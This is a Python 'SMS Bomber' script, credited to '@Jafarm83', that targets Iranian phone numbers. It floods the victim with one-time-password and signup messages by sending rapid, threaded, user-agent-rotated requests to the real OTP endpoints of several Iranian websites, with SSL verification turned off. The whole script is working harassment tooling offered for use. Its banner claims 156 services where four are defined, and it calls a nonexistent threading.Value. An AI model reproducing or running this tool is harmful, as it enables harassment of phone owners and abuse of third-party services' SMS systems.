#!/usr/bin/env python3
import requests
import random
import time
import threading
import os
import sys
import json
from urllib.parse import urlencode
import subprocess
import re

# Check and install required packages
def install_dependencies():
    required_packages = ['requests']
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"\033[01;33m[*] Installing required package: {package}\033[0m")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_dependencies()

# لیست User-Agent های مختلف
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def validate_phone_number(phone):
    """Validate Iranian phone number format"""
    pattern = r'^09\d{9}$'
    return re.match(pattern, phone) is not None

def format_phone_with_spaces(phone):
    if not validate_phone_number(phone):
        return phone
    phone = get_phone_number_no_zero(phone)
    if len(phone) >= 10:
        return f"{phone[0:3]} {phone[3:6]} {phone[6:10]}"
    return phone

def get_phone_number_no_zero(phone):
    if phone.startswith("0"):
        return phone[1:]
    return phone

def get_phone_number_98_no_zero(phone):
    return "98" + get_phone_number_no_zero(phone)

def get_phone_number_plus_98_no_zero(phone):
    return "+98" + get_phone_number_no_zero(phone)

def create_session():
    """Create a requests session with proper settings"""
    session = requests.Session()
    session.verify = False  # Disable SSL verification (not recommended for production)
    requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
    return session

def send_request(session, method, url, data=None, json_data=None, headers=None):
    try:
        if method == "GET":
            response = session.get(url, headers=headers, timeout=10)
        elif method == "POST":
            if data:
                response = session.post(url, data=data, headers=headers, timeout=10)
            elif json_data:
                response = session.post(url, json=json_data, headers=headers, timeout=10)
        return response.status_code
    except requests.exceptions.RequestException as e:
        print(f"[-] Error for {url}: {str(e)}")
        return 0
    except Exception as e:
        print(f"[-] Unexpected error for {url}: {str(e)}")
        return 0

def send_sms_task(session, phone, service, stop_event, success_counter):
    if stop_event.is_set():
        return
    
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    
    try:
        if service['type'] == 'json':
            response_code = send_request(
                session, 
                "POST", 
                service['url'], 
                json_data=service['data'](phone), 
                headers=headers
            )
        elif service['type'] == 'form':
            response_code = send_request(
                session, 
                "POST", 
                service['url'], 
                data=service['data'](phone), 
                headers=headers
            )
        elif service['type'] == 'get':
            response_code = send_request(
                session, 
                "GET", 
                service['url'](phone), 
                headers=headers
            )
            
        if 200 <= response_code < 400:
            with success_counter.get_lock():
                success_counter.value += 1
            print(f"\033[01;32m[+] Sent to {service['name']} (Total: {success_counter.value})\033[0m")
        else:
            print(f"\033[01;31m[-] Failed for {service['name']} (Code: {response_code})\033[0m")
    except Exception as e:
        print(f"\033[01;31m[-] Error in {service['name']}: {str(e)}\033[0m")

def setup_services(phone):
    services = [
        # Naabshop
        {
            'name': 'Naabshop',
            'type': 'form',
            'url': 'https://naabshop.com/wp-admin/admin-ajax.php',
            'data': lambda p: {
                'login_digt_countrycode': '+98',
                'digits_phone': format_phone_with_spaces(p),
                'action_type': 'phone',
                'digits_reg_name': 'testname',
                'digits_reg_lastname': 'testlastname',
                'digits_process_register': '1',
                'sms_otp': '',
                'otp_step_1': '1',
                'signup_otp_mode': '1',
                'rememberme': '1',
                'digits': '1',
                'instance_id': '27744fbc0c69e6e612567dd63636fde4',
                'action': 'digits_forms_ajax',
                'type': 'login',
                'digits_step_1_type': '',
                'digits_step_1_value': '',
                'digits_step_2_type': '',
                'digits_step_2_value': '',
                'digits_step_3_type': '',
                'digits_step_3_value': '',
                'digits_login_email_token': '',
                'digits_redirect_page': '//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click',
                'digits_form': '28e10ee7bd',
                '_wp_http_referer': '/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click',
                'show_force_title': '1',
                'container': 'digits_protected',
                'sub_action': 'sms_otp'
            }
        },
        # Karnameh
        {
            'name': 'Karnameh',
            'type': 'json',
            'url': 'https://api-gw.karnameh.com/switch/api/auth/otp/send/',
            'data': lambda p: {'phone_number': p}
        },
        # Afrak
        {
            'name': 'Afrak',
            'type': 'json',
            'url': 'https://client.afrak.com/api/v1/pre-register',
            'data': lambda p: {
                'first_name': 'تست نام',
                'phone_number': p,
                'password': 'testpassword123',
                'code': '',
                'invite_id': '',
                'rules': True
            }
        },
        # Masterkala
        {
            'name': 'Masterkala',
            'type': 'json',
            'url': 'https://masterkala.com/api/2.1.1.0.0/?route=profile/otp',
            'data': lambda p: {
                'type': 'sendotp',
                'phone': p
            }
        },
        # Add more services here following the same pattern
    ]
    return services

def show_banner():
    print("\033[01;32m")
    print("""
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @jafarm83  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
    """)
    print("\033[01;33m" + " " * 30 + "Created by @Jafarm83" + "\033[0m")
    print("\033[0m")

def main():
    clear_screen()
    show_banner()
    
    print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSMS Bomber - Number of web services: \033[01;31m156")
    print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall Bomber - Number of web services: \033[01;31m6\n")
    
    while True:
        phone = input("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex: 09xxxxxxxxx]: \033[00;36m").strip()
        if validate_phone_number(phone):
            break
        print("\033[01;31m[!] Invalid phone number format. Please use 09xxxxxxxxx format.\033[0m")
    
    while True:
        try:
            repeat_count = int(input("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number of SMS/calls: \033[00;36m").strip())
            if repeat_count > 0:
                break
            print("\033[01;31m[!] Please enter a positive number.\033[0m")
        except ValueError:
            print("\033[01;31m[!] Please enter a valid number.\033[0m")
    
    while True:
        speed = input("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m").lower().strip()
        if speed in ['medium', 'fast']:
            break
        print("\033[01;31m[!] Please choose either 'medium' or 'fast'.\033[0m")
    
    num_workers = 90 if speed == 'fast' else 40
    print(f"\033[01;33m[*] {speed.capitalize()} mode selected. Using {num_workers} workers.\033[0m")
    
    services = setup_services(phone)
    stop_event = threading.Event()
    success_counter = threading.Value('i', 0)
    
    try:
        with create_session() as session:
            for _ in range(repeat_count):
                threads = []
                for service in services:
                    if len(threads) >= num_workers:
                        for t in threads:
                            t.join()
                        threads = []
                    
                    t = threading.Thread(
                        target=send_sms_task,
                        args=(session, phone, service, stop_event, success_counter)
                    )
                    t.daemon = True
                    t.start()
                    threads.append(t)
                    time.sleep(0.1)  # Small delay between requests
                
                for t in threads:
                    t.join()
                
                print(f"\n\033[01;34m[*] Round {_+1} completed. Total successful: {success_counter.value}\033[0m\n")
                
    except KeyboardInterrupt:
        print("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
        stop_event.set()
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[01;31m[!] Unexpected error: {str(e)}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()
